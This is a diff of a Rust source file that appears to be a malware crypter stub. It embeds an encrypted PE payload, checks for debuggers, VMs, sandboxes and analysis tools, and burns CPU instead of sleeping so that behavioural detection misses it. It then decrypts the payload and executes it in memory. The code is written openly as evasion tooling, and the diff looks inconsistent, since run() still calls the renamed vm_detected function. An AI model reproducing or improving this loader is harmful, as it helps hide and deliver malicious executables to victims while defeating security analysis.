@@ -13,23 +13,25 @@ use busywork::{BusyWork, Categories, Intensity};
 use obfstr::obfstr;
 use rand::RngExt;
 
-
-// Embedded at compile time by the crypter.
+// Encrypted + zstd-compressed target PE, embedded at compile time.
 static ENCRYPTED: &[u8] = include_bytes!("../payload.enc");
+
+// Padding bytes for `--add-size`; never read, only referenced by `black_box`.
 static PADDING: &[u8] = include_bytes!("../padding.bin");
 
-fn vm_detected() -> bool {
-    // WARNING: unreliable standalone VM/sandbox check.
-    // The crate's heuristics can be outdated, bypassed, or produce
-    // false negatives on modern or custom-configured VMs.
+fn analysis_detected() -> bool {
+    // WARNING: unreliable standalone analysis check. The crate's heuristics
+    // can be outdated, bypassed, or produce false negatives on modern or
+    // custom-configured environments.
+    //
+    // `antilysis::detected()` returns true if ANY of the following is found:
+    // - suspicious analysis processes (Wireshark, Procmon, pe-sieve, ...)
+    // - debugger processes (x64dbg, WinDbg, ollydbg, ...)
+    // - debugger APIs (IsDebuggerPresent, CheckRemoteDebuggerPresent, NTICE)
+    // - VM driver files (VMware, VirtualBox)
+    // - VM MAC address prefixes (00:05:69, 00:0C:29, 08:00:27, ...)
+    // - known sandbox artifacts
     antilysis::detected().unwrap_or(false)
-}
-
-fn debugger_detected() -> bool {
-    // WARNING: unreliable standalone anti-debug check.
-    // The crate's heuristics can be outdated, bypassed, or produce
-    // false negatives on modern or custom-configured VMs.
-    anti_debug::is_debugger_present().unwrap_or(false)
 }
 
 fn decompress() -> Result<Vec<u8>, std::io::Error> {
@@ -55,10 +57,13 @@ fn execute(pe_bytes: &[u8]) -> Result<(), Box<dyn Error>> {
     Ok(())
 }
 
+// Burn CPU/memory work for duration_secs instead of sleeping, to avoid
+// the static "idle then act" behavioral signature.
 fn behavior_misleading(duration_secs: u64) {
     let target = Duration::from_secs(duration_secs);
     let start = Instant::now();
     let worker = BusyWork::new(Intensity::High).allow(Categories::COMPUTE | Categories::MEMORY);
+
     while start.elapsed() < target {
         worker.run();
     }
@@ -74,11 +79,12 @@ fn delay_execution() {
 }
 
 fn run() -> Result<(), Box<dyn Error>> {
+    // Keep PADDING from being stripped by the linker in release builds.
     std::hint::black_box(&PADDING);
 
     delay_execution();
 
-    if VM_DETECTION && vm_detected() {
+    if ANALYSIS_DETECTION && vm_detected() {
         if VERBOSE {
             logger::log_info(obfstr!("VM detected. Exiting..."));
         }
@@ -86,19 +92,8 @@ fn run() -> Result<(), Box<dyn Error>> {
         return Ok(());
     }
 
-    if debugger_detected() {
-        if VERBOSE {
-            logger::log_info(obfstr!("Debugger detected. Exiting..."));
-        }
-        behavior_misleading(rand::rng().random_range(60..120)); // Random delay between 60 and 120 seconds
-        return Ok(());
-    }
-
-    let ciphertext = decompress()
-        .map_err(|e| format!("Failed to decompress payload: {e}"))?;
-
-    let pe_bytes = decrypt(&ciphertext)
-        .map_err(|_| "Failed to decrypt payload. The encrypted data may be corrupted or the key/nonce may be incorrect.")?;
+    let ciphertext = decompress().map_err(|e| format!("Failed to decompress payload: {e}"))?;
+    let pe_bytes = decrypt(&ciphertext).map_err(|_| "Failed to decrypt payload. The encrypted data may be corrupted or the key/nonce may be incorrect.")?;
 
     execute(&pe_bytes)?;
 
